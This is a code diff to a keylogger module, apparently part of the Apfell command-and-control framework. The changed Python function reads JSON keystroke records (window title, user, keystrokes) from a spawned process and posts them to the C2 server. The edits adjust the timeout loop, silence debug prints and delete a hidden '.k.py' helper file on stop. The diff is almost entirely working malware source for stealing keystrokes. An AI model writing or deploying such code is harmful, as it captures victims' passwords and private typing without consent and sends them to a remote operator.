@@ -27,14 +27,11 @@ def keylog(apfell, c2, params="", task_id=-1):
     c2.post_response(response="Started keylogging with pid: {}".format(str(process.pid)), task_id=task_id)
     while True:
         try:
-            #output = ""
             dict_output = {"window_title":"","user":"","keystrokes":""}
             timeout = time.time() + c2.get_wait_time()
             for line in iter(process.stdout.readline, ''):
-                if time.time() > timeout:
-                    break
                 line_json = json.loads(line.decode('utf-8'))
-                print(line_json)
+                # print(line_json)
                 if line_json['window_title'] == dict_output['window_title']:
                     dict_output['keystrokes'] += line_json['keystrokes']
                 elif dict_output != {"window_title":"","user":"","keystrokes":""}:
@@ -42,7 +39,8 @@ def keylog(apfell, c2, params="", task_id=-1):
                     dict_output = line_json
                 else:
                     dict_output = line_json
-                #output += line.decode('utf-8')
+                if time.time() > timeout:
+                    break
             if dict_output != {"window_title":"","user":"","keystrokes":""}:
                 c2.post_response(response=json.dumps(dict_output), task_id=task_id)
             process.poll()
@@ -51,15 +49,17 @@ def keylog(apfell, c2, params="", task_id=-1):
             if apfell.should_thread_stop(task_id):
                 try:
                     process.kill()
+                except:
+                    pass
+                try:
                     os.remove(".k.py")
                 except:
-                    #print(e)
                     pass
                 apfell.remove_job(task_id)
+                c2.post_response(response="Stopped keylogging", task_id=task_id)
                 exit()
             c2.wait()
         except Exception as e:
-            print("Exiting thread due to: {}\n".format(str(e)))
             break
     c2.post_response(response="Stopped keylogging", task_id=task_id)
     apfell.remove_job(task_id)
